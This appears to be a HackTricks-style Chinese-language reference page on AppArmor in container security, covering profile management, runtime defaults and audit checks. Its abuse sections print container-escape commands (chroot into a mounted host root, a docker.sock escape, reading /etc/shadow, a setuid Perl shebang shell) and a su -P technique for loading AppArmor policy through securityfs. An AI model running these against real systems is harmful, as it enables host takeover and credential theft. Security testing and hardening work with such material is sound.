# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## 概述

AppArmor 是一种**强制访问控制**系统，通过针对每个程序的配置文件施加限制。与高度依赖用户和组所有权的传统 DAC 检查不同，AppArmor 允许内核对附加到进程本身的策略进行强制执行。在容器环境中，这一点很重要：工作负载可能拥有足够的传统权限来尝试某项操作，但仍会因为其 AppArmor 配置文件不允许相关路径、挂载、网络行为或 capability 使用而遭到拒绝。

最重要的概念是，AppArmor 是**基于路径的**。它通过路径规则来判断文件系统访问，而不像 SELinux 那样使用标签。这让它更易于理解且功能强大，但也意味着需要仔细关注 bind mounts 和其他路径布局。如果同一份主机内容可以通过不同路径访问，策略的实际效果可能与操作人员最初的预期不同。

## 在容器隔离中的作用

容器安全审查往往止步于 capabilities 和 seccomp，但这些检查之后，AppArmor 仍然发挥作用。设想一个权限过高的容器，或者一个因运维需要而必须额外获得某项 capability 的工作负载。AppArmor 仍可以限制文件访问、挂载行为、网络活动和执行模式，从而阻止明显的滥用途径。因此，"只是为了让应用正常运行"而禁用 AppArmor，可能会悄然将一个仅有风险的配置转变为可被实际利用的配置。

## 实验

要检查主机上是否启用了 AppArmor，请运行：

```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```

要查看当前容器进程使用的运行环境：

```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```

差异很能说明问题。正常情况下，进程应显示与运行时选择的 profile 关联的 AppArmor 上下文。在 unconfined 情况下，这层额外的限制就消失了。

你也可以检查 Docker 认为自己应用了哪些设置：

```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```

## 运行时用法

当主机支持 AppArmor 时，Docker 可以应用默认或自定义的 AppArmor profile。Podman 也可以在基于 AppArmor 的系统上集成 AppArmor，不过在以 SELinux 为主的发行版上，通常由另一种 MAC 系统发挥主要作用。Kubernetes 可以在实际支持 AppArmor 的节点上，为 workload 配置 AppArmor policy。LXC 及相关的 Ubuntu 系 system container 环境也广泛使用 AppArmor。

实际要点是，AppArmor 并不是“Docker 功能”，而是一项主机内核功能，多个 runtime 都可以选择应用它。如果主机不支持 AppArmor，或者 runtime 被设置为以 unconfined 模式运行，那么所谓的保护实际上并不存在。

具体到 Kubernetes，现代 API 是 `securityContext.appArmorProfile`。从 Kubernetes `v1.30` 开始，较早的 beta AppArmor annotations 已弃用。在受支持的主机上，`RuntimeDefault` 是默认 profile，而 `Localhost` 指向一个必须已在节点上加载的 profile。审查时需要注意这一点，因为 manifest 看起来可能支持 AppArmor，但实际上仍完全依赖节点端的支持和预加载的 profile。<sup>[[1]](#references)</sup>

一个微妙但有用的运维细节是，显式设置 `appArmorProfile.type: RuntimeDefault` 比省略该字段更严格。如果显式设置了该字段，而节点不支持 AppArmor，准入应当失败。如果省略该字段，workload 仍可能在不支持 AppArmor 的节点上运行，只是不会获得这一额外的限制层。从攻击者的角度来看，这正是同时检查 manifest 和节点实际状态的一个好理由。<sup>[[1]](#references)</sup>

在支持 AppArmor 的 Docker 主机上，最知名的默认 profile 是 `docker-default`。该 profile 根据 Moby 的 AppArmor template 生成，这一点很重要，因为它解释了为什么某些基于 capability 的 PoC 在默认容器中仍会失败。总体来说，`docker-default` 允许常规网络操作，禁止向 `/proc` 的许多位置写入，拒绝访问 `/sys` 中的敏感部分，阻止 mount 操作，并限制 ptrace，使其不能成为通用的主机探测手段。理解这一基线有助于区分“容器拥有 `CAP_SYS_ADMIN`”和“容器实际上能针对我关心的内核接口使用该 capability”。

## Profile 管理

AppArmor profile 通常存储在 `/etc/apparmor.d/` 下。常见的命名约定是将可执行文件路径中的斜杠替换为点。例如，`/usr/bin/man` 的 profile 通常存储为 `/etc/apparmor.d/usr.bin.man`。这一点在防御和评估过程中都很重要，因为一旦知道了活动 profile 的名称，通常就能在主机上快速找到对应文件。

常用的主机端管理命令包括：

```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```

在容器安全参考资料中，这些命令之所以重要，是因为它们说明了如何实际构建和加载配置文件、切换到 complain mode，以及在应用程序变更后修改配置文件。如果操作人员在排查问题时习惯将配置文件切换到 complain mode，却忘了恢复强制执行，文档中看起来受保护的容器，实际运行时可能会宽松得多。

### 构建和更新配置文件

`aa-genprof` 可以观察应用程序行为，并帮助以交互方式生成配置文件：

```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```

`aa-easyprof` 可以生成一个模板配置文件，之后可使用 `apparmor_parser` 加载：

```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```

当二进制文件发生变化且需要更新策略时，`aa-logprof` 可以重放日志中记录的拒绝事件，并协助操作员决定是允许还是拒绝：

```bash
sudo aa-logprof
```

### 日志

AppArmor 的拒绝事件通常可通过 `auditd`、syslog 或 `aa-notify` 等工具查看：

```bash
sudo aa-notify -s 1 -v
```

这在运维和攻击中都很有用。防御者用它来完善 profiles。攻击者则用它来了解具体是哪条路径或哪项操作遭到拒绝，以及 AppArmor 是否是阻断 exploit chain 的控制措施。

### 确定确切的 Profile 文件

当 runtime 显示容器使用特定的 AppArmor profile 名称时，通常可以将该名称映射回磁盘上的 profile 文件：

```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```

这在主机侧审查期间尤其有用，因为它弥合了“容器声称自己正在 `lowpriv` profile 下运行”与“实际规则位于这个可供审计或重新加载的特定文件中”之间的差距。

### 值得审计的高信号规则

能够读取 profile 时，不要只关注简单的 `deny` 规则。几类规则会实质性地影响 AppArmor 防御容器逃逸尝试的效果：<sup>[[2]](#references)</sup>

- `ux` / `Ux`：以不受限制的方式执行目标二进制文件。如果某个可访问的 helper、shell 或解释器被允许使用 `ux`，通常应首先测试这一点。
- `px` / `Px` 和 `cx` / `Cx`：在 exec 时执行 profile 转换。这些规则本身不一定有问题，但值得审计，因为转换可能会进入比当前 profile 权限宽泛得多的 profile。
- `change_profile`：允许任务立即或在下次 exec 时切换到另一个已加载的 profile。如果目标 profile 的限制较弱，这可能成为预期的逃逸通道，让任务离开受限的安全域。
- `flags=(complain)`、`flags=(unconfined)` 或较新的 `flags=(prompt)`：这些设置会影响你对 profile 的信任程度。`complain` 只记录拒绝操作，不会强制执行；`unconfined` 会移除安全边界；`prompt` 则依赖用户空间的决策流程，而不是完全由内核强制拒绝。
- `userns` 或 `userns create,`：较新的 AppArmor 策略可以控制 user namespace 的创建。如果容器 profile 明确允许创建 user namespace，那么即使平台将 AppArmor 用作加固策略的一部分，嵌套 user namespace 仍然可用。

主机侧可用的 grep：

```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

这种审计通常比盯着数百条普通文件规则更有用。如果 breakout 依赖于执行辅助程序、进入新的 namespace，或逃逸到限制较少的 profile，答案往往藏在这些面向转换的规则中，而不是显而易见的 `deny /etc/shadow r` 这类行里。

## Misconfigurations

最明显的错误是 `apparmor=unconfined`。管理员经常在调试应用程序时设置这个选项，因为 profile 正确地阻止了某些危险或意外的操作。如果这个标志在生产环境中仍然存在，整个 MAC 层实际上就被移除了。

另一个隐蔽的问题，是以为 bind mounts 无害，因为文件权限看起来正常。由于 AppArmor 基于路径进行控制，将主机路径暴露在其他挂载位置下，可能会与路径规则产生不良交互。第三个错误是忘记：配置文件中的 profile 名称意义不大，除非主机内核确实在强制执行 AppArmor。

## Abuse

AppArmor 被移除后，以前受到限制的操作可能突然就能成功：通过 bind mounts 读取敏感路径、访问原本不应轻易使用的 procfs 或 sysfs 部分、在 capabilities/seccomp 也允许的情况下执行与 mount 相关的操作，或使用 profile 通常会拒绝的路径。AppArmor 往往能解释为什么基于 capability 的 breakout 尝试在纸面上“应该可行”，但实际中仍然失败。移除 AppArmor 后，同样的尝试就可能开始成功。

如果你怀疑 AppArmor 是阻止 path-traversal、bind-mount 或基于 mount 的 abuse 链的主要因素，第一步通常是比较有无 profile 时哪些内容变得可访问。例如，如果某个主机路径已挂载到容器内，先检查你能否遍历并读取它：

```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```

如果容器还拥有 `CAP_SYS_ADMIN` 这类危险 capability，最实用的测试之一就是检查 AppArmor 是否是阻止 mount 操作或访问敏感内核文件系统的控制机制：

```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```

在宿主机路径已通过 bind mount 挂载的环境中，AppArmor 防护失效还可能将只读的信息泄露问题变成直接访问宿主机文件：

```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```

这些命令的重点并不是 AppArmor 本身会造成 breakout，而是移除 AppArmor 后，许多基于文件系统和挂载的滥用路径会立即变得可以测试。

### 完整示例：禁用 AppArmor + 挂载宿主机根目录

如果容器已将宿主机根目录 bind-mount 到 `/host`，移除 AppArmor 就可能让原本受阻的文件系统滥用路径变成完整的宿主机逃逸：

```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

一旦 shell 通过主机文件系统执行，工作负载实际上就已逃逸出容器边界：

```bash
id
hostname
cat /etc/shadow | head
```

### 完整示例：禁用 AppArmor + 运行时套接字

如果真正的屏障是保护运行时状态的 AppArmor，那么挂载一个套接字就足以实现完全逃逸：

```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

具体路径取决于挂载点，但最终结果相同：AppArmor 不再阻止对 runtime API 的访问，而 runtime API 可以启动一个能够攻陷主机的容器。

### 完整示例：基于路径的 Bind-Mount 绕过

由于 AppArmor 基于路径进行保护，保护 `/proc/**` 并不会自动保护通过其他路径访问到的同一主机 procfs 内容：

```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```

具体影响取决于挂载的内容，以及备用路径是否也绕过了其他控制措施；但这种模式清楚地说明，评估 AppArmor 时必须结合挂载布局，而不能孤立地评估。

### 完整示例：Shebang Bypass

AppArmor 可能会将配置文件绑定到被执行的脚本路径，而不是脚本 shebang 中指定的解释器。反过来，直接调用解释器则可能选中解释器的配置文件。一位 [AppArmor 维护者对此区别进行了说明](https://bugs.launchpad.net/apparmor/+bug/1911431)。一个历史示例涉及一个首行指向受限解释器的脚本：

```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```

该示例只是一个候选场景：解释器的文件 capability 可能生效，且脚本的实际 exec attachment 允许该操作。请检查已加载的 policy 和进程 label、capability bounding set、`no_new_privs` 以及挂载点的 `nosuid` 状态；仅凭 profile 文件名或 `cap_setuid+ep` 列表，无法证明可进行有效的权限转换。解释器链和其他执行路径应单独审查。

## Policy-control files as a privileged write primitive

在受影响的 AppArmor kernel 上，非特权用户可以打开 securityfs 中的 `.load`、`.replace` 或 `.remove` 文件进行写入，但直接调用 `write()` 会失败，因为写入时会检查 policy-admin 权限。如果 setuid helper 将该文件描述符继承为 stdout 或 stderr，并写入攻击者控制的字节，kernel 看到的就是 helper 的凭据。这使 helper 成为 policy 数据的*特权写入者*，而不是向调用者普遍授予 root 权限。Qualys 证明，`su -P` 可以通过其特权 PTY 路径，转发以同一用户身份运行的命令所产生的字节；该途径要求用户账户已设置密码。请检查已安装的 kernel 和 `su` 修复，不要仅凭文件权限为全局可写就认定存在风险。<sup>[[3]](#references)[[4]](#references)</sup>

在使用受影响 kernel 和 helper 的一次性实验环境中，这会创建并随后移除一个测试 profile。shell 会在 `su` 写入前打开每个控制文件；`stty raw` 可防止 PTY 转发过程更改编译后的 profile 字节。请勿对生产 profile 运行此测试。<sup>[[3]](#references)</sup>

```bash
printf '/usr/bin/true {\n}\n' > /tmp/ht-aa-probe
apparmor_parser -K -o /tmp/ht-aa-probe.pf /tmp/ht-aa-probe
su -P -c 'stty raw && cat /tmp/ht-aa-probe.pf' "$USER" > /sys/kernel/security/apparmor/.load
grep '/usr/bin/true ' /sys/kernel/security/apparmor/profiles
su -P -c 'stty raw && printf %s /usr/bin/true' "$USER" > /sys/kernel/security/apparmor/.remove
```

同一种原语也可以替换现有 profile。例如，允许 launcher 使用 `userns` 的 profile 可能会移除 AppArmor 对 user namespace 的限制，但不会授予 host-root capabilities；实际的 namespace sysctls 和其他控制措施仍然重要。它也可以移除对目标进程的 confinement。查看 [kernel exposure checks](../../../main-system-information/kernel-vulnerability-assessment.md) 和 [Linux Hardening overview](../../../)，了解更广泛的 privilege-escalation 工作流程。<sup>[[3]](#references)[[4]](#references)</sup>

## Checks

这些检查旨在快速回答三个问题：主机上是否启用了 AppArmor、当前进程是否受到 confinement，以及 runtime 是否确实为此容器应用了 profile？

```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

What is interesting here:

- 如果 `/proc/self/attr/current` 显示 `unconfined`，说明该 workload 未受 AppArmor 限制。
- 如果 `aa-status` 显示 AppArmor 已禁用或未加载，那么 runtime 配置中的任何 profile 名称基本都只是表面功夫。
- 如果 `docker inspect` 显示 `unconfined` 或意外的自定义 profile，这往往就是 filesystem 或基于 mount 的滥用路径能够奏效的原因。
- 如果 `/sys/kernel/security/apparmor/profiles` 中没有你预期的 profile，仅靠 runtime 或 orchestrator 配置是不够的。
- 如果一个号称已强化的 profile 包含 `ux`、宽泛的 `change_profile`、`userns` 或 `flags=(complain)` 这类规则，那么它在实际中的安全边界可能远比 profile 名称所暗示的弱。

如果出于运维原因，容器已经拥有提升的权限，保持 AppArmor 启用往往能决定这究竟是受控的例外，还是范围更广的安全故障。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | 在支持 AppArmor 的主机上默认启用 | 除非另有指定，否则使用 `docker-default` AppArmor profile | `--security-opt apparmor=unconfined`、`--security-opt apparmor=<profile>`、`--privileged` |
| Podman | 取决于主机 | 支持通过 `--security-opt` 使用 AppArmor，但确切的默认行为取决于主机和 runtime，不像 Docker 文档中的 `docker-default` profile 那样普遍适用 | `--security-opt apparmor=unconfined`、`--security-opt apparmor=<profile>`、`--privileged` |
| Kubernetes | 有条件的默认设置 | 如果未指定 `appArmorProfile.type`，默认值为 `RuntimeDefault`，但仅在节点启用了 AppArmor 时才会应用 | `securityContext.appArmorProfile.type: Unconfined`、使用较弱 profile 的 `securityContext.appArmorProfile.type: Localhost`、不支持 AppArmor 的节点 |
| Kubernetes 下的 containerd / CRI-O | 取决于节点/runtime 的支持情况 | 常见的 Kubernetes 支持的 runtime 支持 AppArmor，但实际是否强制执行仍取决于节点支持情况和 workload 设置 | 与 Kubernetes 行相同；直接配置 runtime 也可能完全跳过 AppArmor |

对于 AppArmor，最重要的变量往往是**主机**，而不只是 runtime。在未启用 AppArmor 的节点上，manifest 中的 profile 设置并不会创建安全限制。



## References

- [1] [Kubernetes security context：AppArmor profile 字段和节点支持行为](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Ubuntu 24.04 `apparmor.d(5)` manpage：exec transitions、`change_profile`、`userns` 和 profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
- [3] [Qualys CrackArmor 技术公告](https://cdn2.qualys.com/advisory/2026/03/10/crack-armor.txt)
- [4] [Ubuntu CrackArmor 漏洞知识库](https://ubuntu.com/security/vulnerabilities/crackarmor)
{{#include ../../../../banners/hacktricks-training.md}}
